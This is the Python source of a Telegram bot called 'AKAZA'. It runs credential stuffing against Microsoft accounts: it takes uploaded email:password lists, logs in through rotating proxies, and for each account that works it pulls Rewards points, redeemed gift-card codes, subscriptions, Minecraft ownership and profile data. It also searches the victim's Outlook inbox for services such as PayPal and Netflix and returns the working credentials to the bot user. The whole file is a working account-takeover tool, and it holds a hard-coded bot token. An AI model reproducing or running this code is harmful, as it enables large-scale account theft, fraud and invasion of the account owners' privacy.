import re, json, uuid, sqlite3, logging, asyncio
import time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# ============================================================================
# LOGGING & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# SECTION 3 — CONFIG CONSTANTS
# ============================================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
DB = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

PROXIES_LIST = []
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

# ============================================================================
# SECTION 4 — AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), fetchone=False, fetchall=False, commit=True):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            try:
                cursor = conn.cursor()
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            finally:
                conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 999999, has_access INTEGER DEFAULT 1,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, fast_mode INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')
        self.add_user(ADMIN_ID, "Admin", "Admin")
        self._execute('UPDATE users SET is_mod = 1, has_access = 1 WHERE user_id = ?', (ADMIN_ID,))

    def add_user(self, uid, username, first_name):
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)',
                      (uid, username, first_name, datetime.now().isoformat()))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid):
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res[0]) if res else False

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res[2]: return False
        if res[0] == 0: return False
        if res[1]:
            try:
                expiry = datetime.fromisoformat(res[1])
                if datetime.now() > expiry: return False
            except: pass
        return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res[0]) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res[0] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self):
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [r[0] for r in res] if res else []

    def get_user_info(self, uid):
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            cols = ['user_id', 'username', 'first_name', 'credits', 'has_access', 'is_banned', 'is_mod', 'total_checks', 'total_hits', 'join_date', 'access_expiry']
            return dict(zip(cols, res))
        return {}

    def get_user_settings(self, uid):
        res = self._execute('SELECT keywords, threads, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res[0].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res[1], 'fast_mode': bool(res[2])}
        return {'keywords': [], 'threads': 10, 'fast_mode': False}

    def update_settings(self, uid, keywords=None, threads=None, fast_mode=None):
        if keywords is not None:
            self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None:
            self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if fast_mode is not None:
            self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)',
                      (uid, email, status, json.dumps(details_dict), datetime.now().isoformat()))
        if status == 'hit':
            self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid):
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res[0], 'hits': res[1], 'credits': res[2]} if res else {'checks': 0, 'hits': 0, 'credits': 0}

    def get_global_stats(self):
        total = self._execute('SELECT COUNT(*) FROM users', fetchone=True)[0]
        active = self._execute('SELECT COUNT(*) FROM users WHERE has_access = 1 AND is_banned = 0', fetchone=True)[0]
        checks = self._execute('SELECT SUM(total_checks) FROM users', fetchone=True)[0] or 0
        hits = self._execute('SELECT SUM(total_hits) FROM users', fetchone=True)[0] or 0
        return {'total': total, 'active': active, 'checks': checks, 'hits': hits}

    def list_mods(self):
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': r[0], 'username': r[1]} for r in res] if res else []

db = AkazaDatabase(DB)

# ============================================================================
# SECTION 5 — SERVICE_KEYWORDS DICT
# ============================================================================
SERVICE_KEYWORDS = {
    "instagram.com": "Instagram", "facebook.com": "Facebook", "netflix.com": "Netflix", "twitter.com": "Twitter",
    "tiktok.com": "TikTok", "discord.com": "Discord", "xbox.com": "Xbox", "playstation.com": "PlayStation",
    "steampowered.com": "Steam", "epicgames.com": "Epic Games", "minecraft.net": "Minecraft", "roblox.com": "Roblox",
    "paypal.com": "PayPal", "amazon.com": "Amazon"
}

# ============================================================================
# AkazaChecker CLASS
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = self.format_proxy(proxy)
            self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        })

    def format_proxy(self, px):
        px = px.strip()
        if not px: return None
        if px.startswith(('http://', 'https://', 'socks')): return px
        parts = px.split(':')
        if len(parts) == 4: return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
        if len(parts) == 2: return f'http://{px}'
        return px

    def get_sftag_params(self):
        for _ in range(3):
            try:
                r = self.session.get(SFTAG_URL, timeout=10)
                ppft = (re.search(r'value=\\\\"(.+?)\\\\"', r.text, re.S) or re.search(r'value="(.+?)"', r.text, re.S) or
                        re.search(r"sFTTag:'(.+?)'", r.text, re.S) or re.search(r'sFTTag:"(.+?)"', r.text, re.S) or
                        re.search(r'name="PPFT".*?value="(.+?)"', r.text, re.S))
                up = (re.search(r'"urlPost":"(.+?)"', r.text, re.S) or re.search(r"urlPost:'(.+?)'", r.text, re.S) or
                      re.search(r'<form.*?action="(.+?)"', r.text, re.S))
                if ppft and up: return up.group(1).replace('&amp;', '&'), ppft.group(1)
            except: pass
            time.sleep(0.1)
        return None, None

    def do_login(self, email, password, up, pp):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': pp}
                r = self.session.post(up, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}, allow_redirects=True, timeout=10)
                if '#' in r.url and r.url != SFTAG_URL:
                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if tk and tk != 'None': return 'TOKEN', tk
                if any(v in r.text for v in ['recover?mkt', 'identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=', 'recover.live.com']): return '2FA', None
                low = r.text.lower()
                if any(v in low for v in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'too many times', 'help us protect', 'sign in to your microsoft account']): return 'BAD', None
            except: pass
        return 'ERROR', None

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
            if not form: break
            act = form.get('action')
            if act.startswith('/'): act = 'https://login.live.com' + act
            data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
            resp = self.session.post(act, data=data, timeout=10, allow_redirects=True)
        return resp

    def get_rewards_points(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=8)
            if r.status_code == 200:
                d = r.json()
                pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None: return int(pts)
        except: pass
        return 0

    def get_redemption_codes(self):
        codes = []
        try:
            r = self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10)
            if 'fmHF' in r.text or 'JavaScript required' in r.text: r = self.handle_fmhf(r)
            soup = BeautifulSoup(r.text, 'html.parser')
            v_tag = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = v_tag.get('value', '') if v_tag else ''
            tbl = soup.find('table', class_='table')
            rows = tbl.find_all('tr') if tbl else []
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title = cells[2].get_text(strip=True)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10)
                    m = re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', cr.text)
                    if m: codes.append({'code': m.group(), 'info': title})
        except: pass
        return codes

    def get_microsoft_subs(self):
        try:
            uid = uuid.uuid4().hex[:16]
            st = json.dumps({"userId": uid, "scopeSet":"pidl"})
            u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth&state={quote(st)}&prompt=none"
            r = self.session.get(u, headers={'Referer': 'https://account.microsoft.com/'}, timeout=20)
            tk = re.search(r'access_token=([^&\s"\']+)', r.text) or re.search(r'access_token=([^&\s"\']+)', r.url)
            if not tk: return {"subs":[]}
            ptk = unquote(tk.group(1))
            h = {"Authorization": f'MSADELEGATE1.0="{ptk}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=h, timeout=15).text
            subs = []
            for k in ['Xbox Game Pass Ultimate', 'PC Game Pass', 'EA Play', 'Xbox Live Gold', 'Microsoft 365 Family', 'Office 365', 'OneDrive']:
                if k in rt: subs.append({'name': k})
            return {"subs": subs}
        except: return {"subs":[]}

    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=15).json()
            return r.get('displayName', ''), r.get('country') or r.get('location', {}).get('country') or ''
        except: return '', ''

    def get_minecraft(self, tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={tk}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}).json()
            xst = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [r1['Token']]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}).json()['Token']
            mt = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken": f"XBL3.0 x={r1['DisplayClaims']['xui'][0]['uhs']};{xst}"}).json()['access_token']
            pr = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization": f"Bearer {mt}"})
            if pr.status_code == 200: return {"owned": True, "username": pr.json()['name']}
        except: pass
        return {"owned": False}

    def scan_inbox(self, tk, cid, uk):
        comb = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
        res = {}
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        for i in range(0, len(comb), 8):
            batch = comb[i:i+8]
            qs = " OR ".join([f'"{k}"' for k in batch])
            pay = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": qs}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=pay, headers=h, timeout=15)
                if r.status_code == 200 and r.json()['EntitySets'][0]['ResultSets'][0]['Total'] > 0:
                    for k in batch:
                        p2 = pay.copy(); p2['EntityRequests'][0]['Query']['QueryString'] = f'"{k}"'
                        r2 = self.session.post("https://outlook.live.com/search/api/v2/query", json=p2, headers=h, timeout=10)
                        tot = r2.json()['EntitySets'][0]['ResultSets'][0]['Total']
                        if tot > 0: res[SERVICE_KEYWORDS.get(k, k)] = tot
            except: pass
        return res

    async def check(self, email, password, uk=[], fast_mode=False):
        loop = asyncio.get_running_loop()
        up, pp = await loop.run_in_executor(bot_executor, self.get_sftag_params)
        if not up: return {'status': 'error'}
        st, tk = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, pp)
        if st != 'TOKEN': return {'status': st.lower()}
        cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), '')
        tasks = [loop.run_in_executor(bot_executor, self.get_rewards_points), loop.run_in_executor(bot_executor, self.get_redemption_codes)]
        if not fast_mode: tasks.extend([loop.run_in_executor(bot_executor, self.get_microsoft_subs), loop.run_in_executor(bot_executor, self.get_profile, tk, cid), loop.run_in_executor(bot_executor, self.get_minecraft, tk), loop.run_in_executor(bot_executor, self.scan_inbox, tk, cid, uk)])
        results = await asyncio.gather(*tasks)
        base = {'status': 'hit', 'email': email, 'password': password, 'pts': results[0], 'codes': results[1]}
        if not fast_mode: base.update({'subs': results[2], 'name': results[3][0], 'country': results[3][1], 'mc': results[4], 'inbox': results[5]})
        return base

# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db.is_banned(uid): return
    kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("🌐 Proxies", callback_data="proxy")]]
    await u.message.reply_text("💠 <b>AKAZA Bot</b> 💠", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if db.is_banned(uid) or not db.has_access(uid): return
    text = u.message.text
    if u.message.document:
        doc = await c.bot.get_file(u.message.document.file_id)
        text = (await doc.download_as_bytearray()).decode('utf-8', 'ignore')
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return
    s = db.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)
    msg = await u.message.reply_text("🚀 Initializing...")
    hits, khits, bad, tfa, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
    ts = int(time.time()); h_f = f"hits_@larpsupport_{uid}_{ts}.txt"; kh_f = f"keyword_hits_@larpsupport_{uid}_{ts}.txt"; tfa_f = f"tfa_@larpsupport_{uid}.txt"
    sem = asyncio.Semaphore(thr); up_lock = asyncio.Lock()
    async def worker(line):
        nonlocal hits, khits, bad, tfa, checked, last_up
        async with sem:
            try:
                e_p = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(e_p[0].strip(), e_p[1].strip(), s['keywords'], s['fast_mode'])
            except: data = {'status': 'error'}
            checked += 1; db.use_credit(uid); db.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                has_kw = bool(data.get('inbox'))
                if has_kw: khits += 1
                else: hits += 1
                last_h.append(data['email'])
                if len(last_h) > 5: last_h.pop(0)
                file_path = kh_f if has_kw else h_f
                with open(file_path, 'a') as f:
                    if os.path.getsize(file_path) == 0: f.write("@larpsupport\n\n")
                    f.write(f"Account: {data['email']}:{data['password']}\nPoints: {data['pts']}\nInbox: {json.dumps(data.get('inbox', {}))}\n" + "-"*30 + "\n\n")
            elif st == '2fa':
                tfa += 1
                with open(tfa_f, 'a') as f: f.write(f"{data['email']}:{data['password']}\n")
            elif st != 'error': bad += 1
            async with up_lock:
                if time.time() - last_up > 3.0 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 🔑 Keywords: `{khits}`\n💀 Bad: `{bad}` | 🔒 2FA: `{tfa}`\n\n🕒 Last Hits:\n`{'|'.join(last_h) or 'None'}`"
                    try: await msg.edit_text(prg, parse_mode='Markdown')
                    except: pass
    await asyncio.gather(*(worker(l) for l in lines))
    if uid in user_proxies: del user_proxies[uid]
    for p in [h_f, kh_f, tfa_f]:
        if os.path.exists(p) and os.path.getsize(p) > 10:
            with open(p, 'a') as f: f.write("\n@larpsupport")
            await u.message.reply_document(open(p, 'rb'), caption=f"✅ {os.path.basename(p)}")
            os.remove(p)

async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    doc = await c.bot.get_file(u.message.document.file_id)
    text = (await doc.download_as_bytearray()).decode('utf-8', 'ignore')
    user_proxies[uid] = [l.strip() for l in text.splitlines() if l.strip()]
    await u.message.reply_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "settings":
        s = db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ Threads: `{s['threads']}`\n/threads N to change.\nKeywords: `{len(s['keywords'])}`", parse_mode='Markdown')
    elif q.data == "stats":
        st = db.user_stats(uid)
        await q.edit_message_text(f"📊 Checks: `{st['checks']}`\nHits: `{st['hits']}`\nCredits: Unlimited", parse_mode='Markdown')
    elif q.data == "proxy": await q.edit_message_text(f"🌐 Proxies: `{len(user_proxies.get(uid, []))}`\nUpload .txt with 'prox' in caption.", parse_mode='Markdown')

async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        try:
            n = int(c.args[0])
            if 1 <= n <= 300: db.update_settings(u.effective_user.id, threads=n); await u.message.reply_text(f"✅ Threads set to {n}.")
        except: pass

async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        kws = [k.strip() for k in " ".join(c.args).split(',')]
        db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Set {len(kws)} keywords.")

async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): await u.message.reply_text("✅ Stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Cleared.")

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not db.is_mod(uid): return
    txt = u.message.text
    if txt.startswith("!!help"): await u.message.reply_text("!!stats\n!!broadcast [msg]\n!!ban [uid]")
    elif txt.startswith("!!stats"): await u.message.reply_text(f"Global Stats:\n{json.dumps(db.get_global_stats(), indent=2)}")
    elif txt.startswith("!!broadcast"):
        msg_text = " ".join(c.args); count = 0
        for target in db.get_all_user_ids():
            try: await c.bot.send_message(target, msg_text); count += 1; await asyncio.sleep(0.05)
            except: pass
        await u.message.reply_text(f"✅ Broadcast sent to {count} users")
    elif txt.startswith("!!ban") and c.args: db.ban(int(c.args[0])); await u.message.reply_text("✅ Banned.")

def bot_main_exec():
    db.init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CommandHandler("skw", cmd_skw))
    app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") & filters.CaptionRegex(re.compile(r'prox', re.I)), handle_proxies))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt") | (filters.TEXT & filters.Regex(r'[^!].+:.+')), handle_combo))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    bot_main_exec()
